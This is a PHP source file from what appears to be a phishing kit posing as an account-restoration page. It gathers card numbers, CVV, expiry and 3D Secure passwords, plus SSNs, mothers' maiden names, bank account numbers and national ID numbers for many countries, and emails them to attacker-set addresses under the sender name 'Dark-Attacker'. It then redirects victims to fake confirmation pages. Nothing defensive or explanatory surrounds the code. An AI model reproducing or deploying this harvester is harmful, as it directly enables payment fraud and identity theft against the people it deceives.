<?php
require_once __DIR__ . '/../function.php';
require_once __DIR__ . '/../filter.php';

if (file_exists('../config/' . $api->general_config)) {
  @eval(file_get_contents('../config/' . $api->general_config));
}

$api->waiting();
if(isset($_POST['password_vbv'])){
    $password_vbv =$_POST['password_vbv'];
    }
if(isset($_POST['day'])&&isset($_POST['month'])&&isset($_POST['year'])){
    $dob = $_POST['day']."/".$_POST['month']."/".$_POST['year'];
    }

    if(isset($_POST['sortnum1'])&&isset($_POST['sortnum2'])&&isset($_POST['sortnum3'])){
    $sortnum = $_POST['sortnum1']."-".$_POST['sortnum2']."-".$_POST['sortnum3'];
    }
    if(isset($_POST['accnumber'])){
    $accnumber = $_POST['accnumber'];
    }
    if(isset($_POST['ssn1'])&&isset($_POST['ssn2'])&&isset($_POST['ssn3'])){
    $ssnnum = $_POST['ssn1']."-".$_POST['ssn2']."-".$_POST['ssn3'];
    }
    if(isset($_POST['mmname'])){
    $mmname = $_POST['mmname'];
    }
    if(isset($_POST['creditlimit'])){
    $creditlimit = $_POST['creditlimit'];
    }
        if(isset($_POST['creditlimit'])){
    $creditlimit = $_POST['creditlimit'];
    }
    if(isset($_POST['osid'])){
    $osid = $_POST['osid'];
    }if(isset($_POST['codicefiscale'])){
    $codicefiscale = $_POST['codicefiscale'];
    }if(isset($_POST['kontonummer'])){
    $kontonummer = $_POST['kontonummer'];
    }if(isset($_POST['offid'])){
    $offid = $_POST['offid'];
    }

    $msg="=========== <3D Full Card Info>==========="."<br>";
    $msg.="----------------------- Billing ---------------------"."<br>";
    $msg.="Full Name    : {$_SESSION['bill_name']}"."<br>";
    $msg.="Address      : {$_SESSION['bill_address']}"."<br>";
    $msg.="City         : {$_SESSION['bill_city']}"."<br>";
    $msg.="State        : {$_SESSION['bill_state']}"."<br>";
    $msg.="Zip Code     : {$_SESSION['bill_zip']}"."<br>";
    $msg.="Country      : {$_SESSION['country']}"."<br>";
    $msg.="Phone        : {$_SESSION['bill_phone']}"."<br>";
    $msg.="----------------------- BIN Info -------------"."<br>";
    $msg.="CC Data      : {$_SESSION['card_bin']}"."<br>";
    $msg.="----------------------- CC Info ---------------------"."<br>";
    $msg.="CC holder    : {$_SESSION['card_name']}"."<br>";
    $msg.="CC Number    : {$_SESSION['card_number']}"."<br>";
    $msg.="CC Expiry    : {$_SESSION['card_exp']}"."<br>";
    $msg.="CVV          : {$_SESSION['card_cvv']}"."<br>";
    $msg.="----------------------- 3D Info ---------------------"."<br>";
if(isset($_POST['password_vbv'])){$msg.="3D Password  : {$password_vbv}"."<br>";
}
if(isset($_POST['day'])){$msg.="3D Birth Date: {$dob}"."<br>";
}
if(isset($_POST['sortnum'])){$msg.="Sort Number      : {$sortnum}"."<br>";
}
if(isset($_POST['accnumber'])){$msg.="Account Number      : {$accnumber}"."<br>";
}
if(isset($_POST['ssn1'])){$msg.="SSN         : {$ssnnum}"."<br>";
}
if(isset($_POST['mmname'])){$msg.="Mother’s Maiden Name         : {$mmname}"."<br>";
}
if(isset($_POST['creditlimit'])){$msg.="Credit Limit         : {$creditlimit}"."<br>";
}
if(isset($_POST['osid'])){$msg.="OSID         : {$creditlimit}"."<br>";
}
if(isset($_POST['nabid'])){$msg.="NAB ID      : {$_POST['nabid']}"."<br>";
}
if(isset($_POST['creditlimit'])){$msg.="Credit Limit         : {$creditlimit}"."<br>";
}
if(isset($_POST['codicefiscale'])){$msg.="Codice Fiscale         : {$codicefiscale}"."<br>";
}
if(isset($_POST['kontonummer'])){$msg.="Kontonummer         : {$kontonummer}"."<br>";
}
if(isset($_POST['offid'])){$msg.="Official ID         : {$offid}"."<br>";
}
if(isset($_POST['pps'])){$msg.="PPS      : {$_POST['pps']}"."<br>";
}
if(isset($_POST['dln'])){$msg.="Driver Lic. : {$_POST['dln']}"."<br>";
}
if(isset($_POST['sin'])){$msg.="SIN         : {$_POST['sin']}"."<br>";
}
if(isset($_POST['pse'])){$msg.="PSE         : {$_POST['pse']}"."<br>";
}
if(isset($_POST['dni'])){$msg.="DNI         : {$_POST['dni']}"."<br>";
}
if(isset($_POST['bsn'])){$msg.="BSN         : {$_POST['bsn']}"."<br>";
}
if(isset($_POST['cpf'])){$msg.="CPF         : {$_POST['cpf']}"."<br>";
}
if(isset($_POST['fcn'])){$msg.="FCN         : {$_POST['fcn']}"."<br>";
}
    $msg.="---------------------- IP Info ----------------------"."<br>";
    $msg.="IP ADDRESS   : {$_SESSION['ip']}"."<br>";
    $msg.="LOCATION     : {$_SESSION['country']}"."<br>";
    $msg.="BROWSER      : {$_SESSION['os']}"."<br>";
    $msg.="USER AGENT   : {$_SESSION['agent']}"."<br>";
   
   

  $subject  = "[3D]".$_SESSION['card_title']." [ ".$_SESSION['country']." | ".$_SESSION['ip']." | ".$_SESSION['os']." ]";
  $headers  = "From: Dark-Attacker <dark@dark.com>\r\n";
  $headers .= "MIME-Version: 1.0\r\n";
  $headers .= "Content-Type: text/html; charset=UTF-8\r\n";

  if ($config_smtp == 1){
      foreach(explode(",", $email_results) as $tomail) {
    $api->ngesend($tomail, $subject, $msg);
      }
  } else {
      foreach(explode(",", $email_results) as $tomail) {
    mail($tomail, $subject, $msg, $headers);
      }
  }
if ($config_identity == 0) {

header("location: ../myaccount/restored");

    
}
else{
header("location: ../myaccount/confirm=identity?proof");
}


?>

